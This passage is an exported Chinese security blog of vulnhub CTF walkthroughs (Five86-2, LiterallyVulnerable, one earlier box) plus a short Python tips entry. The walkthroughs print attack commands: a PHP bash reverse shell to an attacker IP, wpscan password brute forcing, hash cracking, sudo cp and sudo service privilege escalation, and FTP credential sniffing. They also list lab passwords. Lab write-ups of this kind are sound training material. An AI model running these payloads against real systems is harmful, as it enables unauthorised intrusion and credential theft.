-<p>使用 <code>47691.sh</code> 如果报错的话，可以先 <code>dos2unix</code> 转换一下格式，作者可能在 <code>dos</code> 环境下写的脚本</p>
-<br>
-
-<p><img src="2020-02-14-18-38-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<br>
-<br>
-
-<p>使用 MSF：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 先复制到桌面</span></span><br><span class="line">cp /usr/share/exploitdb/exploits/php/webapps/47772.rb ~/Desktop/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制到 MSF 内利用</span></span><br><span class="line">cp 47772.rb /usr/share/metasploit-framework/modules/exploits/</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<p><img src="2020-02-14-15-10-23%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt></p>
-<br>
-
-<p>测试发现存在 <code>Python</code> 使用交互式 shell</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; shell</span><br><span class="line"></span><br><span class="line">python -c <span class="string">"import pty;pty.spawn('/bin/bash')"</span></span><br></pre></td></tr></table></figure>
-
-<br>
-
-<p>先看 <code>/etc/passwd</code> 有多少用户及有价值信息。目录全无访问权</p>
-<br>
-
-<p><img src="2020-02-14-15-13-04%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt></p>
-<p><img src="2020-02-14-15-13-36%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<br>
-
-<p>这个时就需要最后的搜刮一下，得到了一组用户密码。其他用户，无有价值信息：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep -ri --color=auto --exclude-dir=proc/ <span class="string">'douglas'</span> / 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<p><img src="2020-02-14-15-28-42%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt></p>
-<p><img src="2020-02-14-15-30-08%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<br>
-
-<hr>
-<br>
-
-<p>Hash 破解，没跑成来，查了一下，会用到作者给的提示 <code>aefhrt</code>。使用 <code>crunch</code> 生产字典：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
-
-<br>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ crunch 10 10 aefhrt &gt;word.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">$ crunch 10 10 aefhrt -o word.txt</span><br><span class="line"></span><br><span class="line">$ john --wordlist=word.txt <span class="built_in">hash</span> </span><br><span class="line">$ john --show <span class="built_in">hash</span> </span><br><span class="line"></span><br><span class="line">?:fatherrrrr</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<p><img src="2020-02-14-15-51-31%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<br>
-
-<h2 id="身份切换-SSH免密登陆"><a href="#身份切换-SSH免密登陆" class="headerlink" title="身份切换(SSH免密登陆)"></a>身份切换(SSH免密登陆)</h2><br>
-
-<p>登录 SSH，得到普通用户，目录下除了 <code>.ssh/</code> 外无其他有价值信息。</p>
-<p>可使用的 <code>sudo</code> 命令为 <code>cp</code> ：</p>
-<br>
-
-<p><img src="2020-02-14-16-03-08%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<br>
-
-<p>涉及知识的盲区了，特地去查询记录了一下</p>
-<br>
-
-<p><code>cp</code> 命令可以配合  <code>SSH（authorized_keys）</code> 免密登录到其他用户：</p>
-<br>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 为目标生成 ssh key</span></span><br><span class="line">ssh-keygen -b 2048</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制生成的 id_rsa.pub 到 /tmp 下并改名为 authorized_kes</span></span><br><span class="line">cp /home/douglas/.ssh/id_rsa.pub /tmp/authorized_kes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 改变 authorized_kes 的权限</span></span><br><span class="line">chmod 777 authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制到目标 .ssh/ 下</span></span><br><span class="line">sudo -u jen /bin/cp authorized_keys /home/jen/.ssh/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 登陆</span></span><br><span class="line">ssh jen@127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<br>
-
-<p><img src="2020-02-14-16-16-13%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<p><img src="2020-02-14-16-18-58%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<br>
-
-<p>说是有邮件，查看邮件，得到另一组用户名和密码，登陆成功。</p>
-<br>
-
-
-<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><br>
-
-<p>看目录，得到一个 <code>SUID</code> 的二进制文件，可以直接成为 <code>root</code> ，进 <code>root</code> 目录，得到 Flag</p>
-<br>
-<br>
-
-<p><img src="2020-02-14-16-25-30%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<p><img src="2020-02-14-16-28-08%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
-<br>
-
-<hr>
-<br>
-
-<p>与其说是提权，不如说是作者准备好的外挂道具，让你可以一举成神，有种欲求不满的感觉，前面刚鼓起的劲，到了后面直接一键 <code>root</code> ，无法满足啊</p>
-<br>
-
-<p>不过，也是学到技能了</p>
-<br>
-
-<p>也可以使用如下方式：</p>
-<ul>
-<li>创建一个权限 <code>777</code> 的文件</li>
-<li>使用 <code>find</code> 命令查找 <code>Jen</code> 创建的文件</li>
-<li>使用 <code>cp</code> 命令，复制找到的文件 到 <code>777</code> 权限的 文件</li>
-<li><code>cat</code> 查看</li>
-</ul>
-<br>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sudo -u</span></span><br><span class="line">-u, --user=user              <span class="comment"># 以指定用户或 ID</span></span><br></pre></td></tr></table></figure>
-
-<br>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u jen /bin/cp /var/mail/jen ./<span class="built_in">test</span></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>vulnhub</category>
-      </categories>
-      <tags>
-        <tag>vulnhub</tag>
-        <tag>OSCP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Five86-2</title>
-    <url>/2020/03/19/Five86-2/</url>
-    <content><![CDATA[<blockquote>
-<p>2020-02-26</p>
-</blockquote>
-<h2 id="情报收集"><a href="#情报收集" class="headerlink" title="情报收集"></a>情报收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">20/tcp closed ftp-data</span><br><span class="line">21/tcp open   ftp      ProFTPD 1.3.5e</span><br><span class="line">80/tcp open   http     Apache httpd 2.4.41 ((Ubuntu))</span><br></pre></td></tr></table></figure>
-
-<p>无 <code>ProFTPD 1.3.5e</code> 相关漏洞，无法匿名登录</p>
-<p>后台放置目录枚举，<code>WordPress</code> 站点 <code>wpscan</code> 扫描</p>
-<p><img src="2020-02-26-15-21-50%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-26-15-21-50屏幕截图"> <img src="2020-02-26-15-22-25%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-26-15-22-25屏幕截图"> </p>
-<p>逐一访问，无有价值信息，<code>wpscan</code> 枚举出了几个用户名：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">barney</span><br><span class="line">peter</span><br><span class="line">admin</span><br><span class="line">gillian</span><br><span class="line">stephen</span><br></pre></td></tr></table></figure>
-
-<p>尝试枚举爆破，枚举出两个密码：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://192.168.56.117 -U tmp/user.txt -P /usr/share/wordlists/rockyou.txt -t 30</span><br><span class="line"></span><br><span class="line"><span class="comment"># [SUCCESS] - barney / spooky1                                                                 </span></span><br><span class="line"><span class="comment"># [SUCCESS] - stephen / apollo1</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="2020-02-26-15-53-05%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-26-15-53-05屏幕截图"> </p>
-<p><img src="2020-02-26-16-37-11%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-26-16-37-11屏幕截图"> </p>
-<h2 id="撬开大门"><a href="#撬开大门" class="headerlink" title="撬开大门"></a>撬开大门</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">barney ： spooky1   </span><br><span class="line">stephen ： apollo1</span><br></pre></td></tr></table></figure>
-
-<p>两个账号均可登录后台，不过 <code>stephen</code> 无利用点</p>
-<p><code>barney</code> 登陆后，有三个插件，搜索相关漏洞，除第三个插件外，其他暂无价值：</p>
-<p>根据 <code>PoC</code> 说明，写出 <code>exp</code> ，上传后，本地端口监听，访问上传网址，得到 <code>shell</code>：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> exec(<span class="string">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.56.109/8848 0&gt;&amp;1'"</span>);</span><br></pre></td></tr></table></figure>
-
-<p>注意：用 <code>echo</code> 写入的时候注意引号的转义，写入后最好再查看一遍利用脚本的内容是否正确</p>
-<p><img src="2020-02-26-17-37-01%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-26-17-37-01屏幕截图"></p>
-<p><img src="2020-02-26-17-37-18%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-26-17-37-18屏幕截图"> <img src="2020-02-26-17-34-20%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="被忽略的转义"></p>
-<h2 id="登堂入室"><a href="#登堂入室" class="headerlink" title="登堂入室"></a>登堂入室</h2><p>接收到了 <code>shell</code> 先收集一波信息，最喜欢的 <code>/etc/passwd</code> 里总是包含用户及其主目录，<code>HOME</code> 下的用户目录无访问权限</p>
-<p>各种信息收集了一波，当前用户的作用实在不大。无思路无目的时候，就是收集的情报不够，整理一下现有资料：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT   STATE  SERVICE  VERSION</span><br><span class="line">20/tcp closed ftp-data</span><br><span class="line">21/tcp open   ftp      ProFTPD 1.3.5e					无相关漏洞</span><br><span class="line">80/tcp open   http     Apache httpd 2.4.41 ((Ubuntu))	无相关漏洞</span><br><span class="line"><span class="comment">#####################</span></span><br><span class="line">barney		spooky1		FTP：No	WordPress：OK</span><br><span class="line">peter</span><br><span class="line">admin</span><br><span class="line">gillian</span><br><span class="line">stephen		apollo1		FTP：No	WordPress：OK</span><br><span class="line"><span class="comment">######################</span></span><br><span class="line">barney		:x:1001:1001:Barney Sumner:/home/barney:/bin/bash</span><br><span class="line">stephen		:x:1002:1002:Stephen Morris:/home/stephen:/bin/bash</span><br><span class="line">peter		:x:1003:1003:Peter Hook:/home/peter:/bin/bash</span><br><span class="line">gillian		:x:1004:1004:Gillian Gilbert:/home/gillian:/bin/bash</span><br><span class="line">richard		:x:1005:1005:Richard Starkey:/home/richard:/bin/bash</span><br><span class="line">paul		:x:1006:1006:Paul McCartney:/home/paul:/bin/bash</span><br><span class="line">john		:x:1007:1007:John Lennon:/home/john:/bin/bash</span><br><span class="line">george		:x:1008:1008:George Harrison:/home/george:/bin/bash</span><br><span class="line"><span class="comment">#####################</span></span><br><span class="line">得到密码的两个账号无法登陆 FTP</span><br><span class="line"></span><br><span class="line"><span class="comment">#####################									&lt;----- 未验证/未收集</span></span><br><span class="line">Linux kernel 信息未收集（内核提权）</span><br><span class="line">FTP 没有起到作用（存在即有理）</span><br><span class="line"></span><br><span class="line"><span class="comment">####################</span></span><br><span class="line">两个账户存在于 /etc/passwd 下，是否可以切换用户</span><br><span class="line">barney 密码错误</span><br><span class="line">stephen 可以切换</span><br><span class="line"><span class="comment">####################</span></span><br><span class="line">barney		spooky1		FTP：No	WordPress：OK	su：NO</span><br><span class="line">peter</span><br><span class="line">admin</span><br><span class="line">gillian</span><br><span class="line">stephen		apollo1		FTP：No	WordPress：OK	su：OK	&lt;----- 切入点</span><br></pre></td></tr></table></figure>
-
-<p><img src="2020-02-26-17-38-13%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-26-17-38-13屏幕截图"></p>
-<h2 id="身份转换"><a href="#身份转换" class="headerlink" title="身份转换"></a>身份转换</h2><p><code>su stephen</code> ：切换用户</p>
-<p>不存在 <code>sudo</code> 权限，主目录暂无利用信息，卡住了</p>
-<p>查了一下 WriteUp，抓 <code>FTP</code> 的包，有明文密码：</p>
-<p>查看相关进程：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps -aux | grep <span class="string">"ftp"</span></span><br><span class="line"></span><br><span class="line">systemd+  1376  0.0  0.9 119972  9484 pts/0    Ss+  02:32   0:00 proftpd: (accepting connections)</span><br><span class="line">paul      2883  0.0  0.0   2600   732 ?        Ss   05:38   0:00 /bin/sh -c /home/paul/ftp_upload.sh &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">paul      2884  0.0  0.0   2600   864 ?        S    05:38   0:00 /bin/sh /home/paul/ftp_upload.sh</span><br><span class="line">paul      2885  0.0  0.2   3224  2036 ?        S    05:38   0:00 ftp -n 172.18.0.10</span><br><span class="line">1000      2886  0.0  0.8 133072  8136 pts/0    S+   05:38   0:00 proftpd: paul - 172.18.0.1: STOR file.txt</span><br><span class="line">stephen   2889  0.0  0.0   6296   924 pts/0    S+   05:38   0:00 grep ftp</span><br></pre></td></tr></table></figure>
-
-<p>查看 FTP 监听的网卡：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip addr</span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">3: br-eca3858d86bf: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default </span><br><span class="line">    link/ether 02:42:9e:df:8d:0f brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-eca3858d86bf</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::42:9eff:fedf:8d0f/64 scope link</span><br></pre></td></tr></table></figure>
-
-<p>抓包，得到密码：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">timeout 50 tcpdump -i br-eca3858d86bf -w pack.pcap</span><br><span class="line">tcpdump -r pack.pcap</span><br></pre></td></tr></table></figure>
-
-<p><img src="2020-02-27-13-39-28%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-27 13-39-28屏幕截图"> </p>
-<p><img src="2020-02-27-14-40-50%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-27 14-40-50屏幕截图"> </p>
-<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>登录 <code>paul</code> 查看可以 <code>sudo</code> 执行的程序：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Matching Defaults entries <span class="keyword">for</span> paul on five86-2:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User paul may run the following commands on five86-2:</span><br><span class="line">    (peter) NOPASSWD: /usr/sbin/service</span><br></pre></td></tr></table></figure>
-
-<p><code>/usr/sbin/service</code> 提权：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u peter service ../../bin/bash</span><br></pre></td></tr></table></figure>
-
-<p>查看可以 <code>sudo</code> 执行的程序：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Matching Defaults entries <span class="keyword">for</span> peter on five86-2:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User peter may run the following commands on five86-2:</span><br><span class="line">    (ALL : ALL) ALL</span><br><span class="line">    (root) NOPASSWD: /usr/bin/passwd</span><br></pre></td></tr></table></figure>
-
-<p>修改 <code>root</code> 密码，登录 <code>root</code> 查看 <code>flag</code> ：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo passwd root</span><br><span class="line"></span><br><span class="line">su -</span><br></pre></td></tr></table></figure>
-
-<p><img src="2020-02-27-14-54-14%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-27 14-54-14屏幕截图"> </p>
-<hr>
-<p>卡在了 <code>FTP</code> 抓包的位置，还是经验不足</p>
-<p>前期收集的信息必定是有用的，<code>FTP</code> 使用明文传输密码，只需要抓包，就可以得到</p>
-<p>查看系统正在运行的进程也要加入信息收集里面</p>
-]]></content>
-      <categories>
-        <category>vulnhub</category>
-      </categories>
-      <tags>
-        <tag>vulnhub</tag>
-        <tag>OSCP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Python不常用用法</title>
-    <url>/2019/09/04/Python%E4%B8%8D%E5%B8%B8%E7%94%A8%E7%94%A8%E6%B3%95/</url>
-    <content><![CDATA[<p>Python 日常使用时的一些方法或技巧，怕忘记怕麻烦，记录一下</p>
-<a id="more"></a>
-
-<h2 id="通过值获取键"><a href="#通过值获取键" class="headerlink" title="通过值获取键"></a>通过值获取键</h2><br>
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>dct = &#123;<span class="string">'Name'</span>: <span class="string">'Alice'</span>, <span class="string">'Age'</span>: <span class="number">18</span>, <span class="string">'uid'</span>: <span class="number">1001</span>, <span class="string">'id'</span>: <span class="number">1001</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">get_key1</span><span class="params">(dct, value)</span>:</span></span><br><span class="line"><span class="meta">... </span>  <span class="keyword">return</span> list(filter(<span class="keyword">lambda</span> k:dct[k] == value, dct))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_key1(dct, <span class="number">1001</span>)</span><br><span class="line">[<span class="string">'id'</span>, <span class="string">'uid'</span>]</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 某函数返回的结果（参数 md5dict）</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">'/root/MyDocs/Python/02-PhotosMD5/76478297_p0.jpg'</span>: <span class="string">'6beb7af8d37e26eb88bb1b75c8e51474'</span>, </span><br><span class="line">    <span class="string">'/root/MyDocs/Python/02-PhotosMD5/76478297_p0_copy.jpg'</span>: <span class="string">'6beb7af8d37e26eb88bb1b75c8e51474'</span>, </span><br><span class="line">    <span class="string">'/root/MyDocs/Python/02-PhotosMD5/561284.jpg'</span>: <span class="string">'4f9d1c75bd62b0d7e3fdd0abd810ce34'</span>, </span><br><span class="line">    <span class="string">'/root/MyDocs/Python/02-PhotosMD5/561271.jpg'</span>: <span class="string">'bb60b6e6626968cde17cad0a8f18290b'</span>, </span><br><span class="line">    <span class="string">'/root/MyDocs/Python/02-PhotosMD5/561279.jpg'</span>: <span class="string">'e5af4c3275dafbef5932ab69c446374c'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 变量 cp的内容</span></span><br><span class="line">(<span class="string">'6beb7af8d37e26eb88bb1b75c8e51474'</span>, <span class="number">2</span>)</span><br><span class="line">(<span class="string">'4f9d1c75bd62b0d7e3fdd0abd810ce34'</span>, <span class="number">1</span>)</span><br><span class="line">(<span class="string">'bb60b6e6626968cde17cad0a8f18290b'</span>, <span class="number">1</span>)</span><br><span class="line">(<span class="string">'e5af4c3275dafbef5932ab69c446374c'</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">analysedDict</span><span class="params">(md5dict)</span>:</span></span><br><span class="line">    cp = Counter(md5dict.values())  <span class="comment"># 只取 MD5值</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">filterFun</span><span class="params">(dicts, value)</span>:</span></span><br><span class="line">        bad = list(filter(<span class="keyword">lambda</span> k:dicts[k] == value, dicts))</span><br><span class="line">        print(bad)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.items():</span><br><span class="line">        <span class="keyword">if</span> i[<span class="number">1</span>] &gt; <span class="number">1</span>:</span><br><span class="line">            print(<span class="string">"\033[0;31m&#123;0&#125;\033[0m"</span>.format(i))</span><br><span class="line">            filterFun(md5dict, i[<span class="number">0</span>])</span><br><span class="line">            </span><br><span class="line"><span class="comment"># ---- 结果 ------</span></span><br><span class="line"><span class="comment"># ('6beb7af8d37e26eb88bb1b75c8e51474', 2)</span></span><br><span class="line"><span class="comment"># ['/root/MyDocs/Python/02-PhotosMD5/76478297_p0.jpg', '/root/MyDocs/Python/02-PhotosMD5/76478297_p0_copy.jpg']</span></span><br></pre></td></tr></table></figure>
-
-<br>
-
-<h2 id="快速启动-http服务器"><a href="#快速启动-http服务器" class="headerlink" title="快速启动 http服务器"></a>快速启动 http服务器</h2><br>
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line">python -m SimpleHTTPServer</span><br></pre></td></tr></table></figure>]]></content>
-      <tags>
-        <tag>Python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>LiterallyVulnerable</title>
-    <url>/2020/03/19/LiterallyVulnerable/</url>
-    <content><![CDATA[<blockquote>
-<p>2020-03-08 14:26 — 2020-03-09</p>
-</blockquote>
-<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Flags</span>: <span class="number">3</span> (local.txt, user.txt &amp; root.txt)</span><br><span class="line">Difficulty <span class="attribute">Level</span>: Initial Shell (Easy) - Privileges Escalation (Intermediate)</span><br><span class="line"><span class="attribute">Website</span>: <span class="attribute">https</span>:<span class="comment">//ebryx.com</span></span><br><span class="line"><span class="attribute">Hint</span>: Maybe, you hasted and left some open holes unchecked?</span><br><span class="line">Literally Vulnerable is supposed to give beginners a taste of real-world scenarios and OSCP machines at the same time! It was inspired highly by the <span class="variable">@DC</span> series.</span><br><span class="line"></span><br><span class="line">You're supposed to know the big three (EEEs) Enumeration, Exploitation &amp; Escalation of pentesting to pwn the machine. The machine is supposed to be beginner-friendly and the difficulty level is Easy-Intermediate depending on your knowledge. You need to have enough information about Linux file types &amp; permissions for privileges escalation.</span><br><span class="line"></span><br><span class="line">Technical <span class="attribute">Information</span>:</span><br><span class="line">Just download, extract and load the .vmx file in VMware Workstation (tested on VMware Workstation <span class="number">15</span>.x.x)</span><br><span class="line">The adapter is currently NAT, networking is configured for DHCP and IP will get assigned automatically</span><br><span class="line"><span class="attribute">Contact</span>:</span><br><span class="line">You can either contact me on twitter <span class="variable">@syed__umar</span> or linkedin (/in/syedumararfeen/) for hints!</span><br><span class="line">There are three flags in the <span class="attribute">machine</span>: local.txt, user.txt &amp; root.txt. You're supposed to grab all three in order to completely pwn the machine. Hope you like the machine, best of luck! :)</span><br><span class="line"></span><br><span class="line">I'll try my best to continue with the series!</span><br><span class="line">--------</span><br><span class="line"><span class="attribute">From </span>: <span class="attribute">https</span>:<span class="comment">//www.vulnhub.com/entry/ua-literally-vulnerable,407/</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali：172.16.252.129</span><br><span class="line">目标：172.16.252.1/24</span><br></pre></td></tr></table></figure>
-
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>主机存活：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -n -sn -T5 -v 172.16.252.1/24 | grep -B 1 <span class="string">"Host is up"</span></span><br></pre></td></tr></table></figure>
-
-<p>目标端口服务：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -n -Pn -sV -O 172.16.252.131</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    nginx 1.14.0 (Ubuntu)</span><br></pre></td></tr></table></figure>
-
-<p>全部端口：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT STATE SERVICE VERSION</span><br><span class="line">21/tcp open ftp vsftpd 3.0.3</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_-rw-r--r-- 1 ftp ftp 325 Dec 04 13:05 backupPasswords </span><br><span class="line">| ftp-syst:</span><br><span class="line">| 	STAT:</span><br><span class="line">| FTP server status:</span><br><span class="line">| Connected to ::ffff:172.16.252.129</span><br><span class="line">| Logged <span class="keyword">in</span> as ftp</span><br><span class="line">| TYPE: ASCII</span><br><span class="line">| No session bandwidth <span class="built_in">limit</span></span><br><span class="line">| Session timeout <span class="keyword">in</span> seconds is 300</span><br><span class="line">| Control connection is plain text</span><br><span class="line">| Data connections will be plain text</span><br><span class="line">| At session startup, client count was 1</span><br><span class="line">| vsFTPd 3.0.3 - secure, fast, stable </span><br><span class="line">|_End of status</span><br><span class="line">22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) </span><br><span class="line">| ssh-hostkey:</span><br><span class="line">| 2048 2f:26:5b:e6:ae:9a:c0:26:76:26:24:00:a7:37:e6:c1 (RSA)</span><br><span class="line">| 256 79:c0:12:33:d6:6d:9a:bd:1f:11:aa:1c:39:1e:b8:95 (ECDSA) </span><br><span class="line">|_ 256 83:27:d3:79:d0:8b:6a:2a:23:57:5b:3c:d7:b4:e5:60 (ED25519)</span><br><span class="line">80/tcp open http nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-generator: WordPress 5.3</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: Not so Vulnerable &amp;<span class="comment">#8211; Just another WordPress site </span></span><br><span class="line">|_http-trane-info: Problem with XML parsing of /evox/about</span><br><span class="line">65535/tcp open http </span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br></pre></td></tr></table></figure>
-
-<p>开启的端口：21、22、80、65535</p>
-<h3 id="FTP-匿名登陆"><a href="#FTP-匿名登陆" class="headerlink" title="FTP 匿名登陆"></a>FTP 匿名登陆</h3><p>FTP 可以匿名访问，得到几个密码，暂不知用途：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">*<span class="variable">$eGRIf7v38s</span>&amp;p7 </span><br><span class="line">yP$*SV09YOrx7mY </span><br><span class="line">GmceC&amp;oOBtbnFCH </span><br><span class="line">3!IZguT2piU8X<span class="variable">$c</span> </span><br><span class="line">P&amp;s%F1D4<span class="comment">#KDBSeS</span></span><br><span class="line"><span class="variable">$EPid</span>%J2L9LufO5 </span><br><span class="line">nD!mb*aHON&amp;76&amp;G </span><br><span class="line">$*Ke7q2ko3tqoZo </span><br><span class="line">SCb<span class="variable">$I</span>^gDDqE34fA </span><br><span class="line">Ae%tM0XIWUMsCLp</span><br></pre></td></tr></table></figure>
-
-<p><img src="2020-03-08-14-48-33%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08 14-48-33屏幕截图"></p>
-<p> <img src="2020-03-08-14-49-20%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08 14-49-20屏幕截图">  </p>
-<h3 id="Web-目录枚举"><a href="#Web-目录枚举" class="headerlink" title="Web 目录枚举"></a>Web 目录枚举</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">80/tcp open http nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-generator: WordPress 5.3</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: <span class="keyword">Not</span> so Vulnerable &amp;#8211; Just another WordPress site </span><br><span class="line">|_http-trane-info: Problem with XML parsing of /evox/about</span><br><span class="line">65535/tcp open http </span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu<span class="built_in"> Default </span>Page: It works</span><br></pre></td></tr></table></figure>
-
-<p>80 端口： nginx + Wordpress</p>
-<p>65535端口：Apache</p>
-<p>控制台显示资源请求错误多，可以看到它是从 <code>literally.vulnerable</code> 请求资源，可以设置 DNS：</p>
